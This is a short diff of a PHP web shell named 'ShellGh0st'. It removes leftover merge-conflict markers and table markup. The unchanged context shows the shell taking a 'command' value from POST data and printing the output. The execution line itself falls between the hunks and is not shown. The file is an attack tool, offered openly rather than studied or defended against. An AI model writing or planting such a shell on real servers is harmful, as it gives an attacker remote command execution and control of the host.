@@ -51,12 +51,6 @@ body{
 			<h1>ShellGh0st</h1>
 		</dir>
 		<div class="ResultCommand">
-<<<<<<< HEAD
-=======
-		<table>
-			<tr>
-			<td>
->>>>>>> 22fc62e631f214a22a916abfffb5e335d5baaf67
 			<?php
 				$cmd = $_POST['command'];
 				if(!empty($cmd)){
@@ -65,12 +59,6 @@ body{
 					echo "</pre>";
 				}
 			?>
-<<<<<<< HEAD
-=======
-			</td>
-			</tr>
-		</table>
->>>>>>> 22fc62e631f214a22a916abfffb5e335d5baaf67
 		</div>
 
 		<div class="InputCommand">
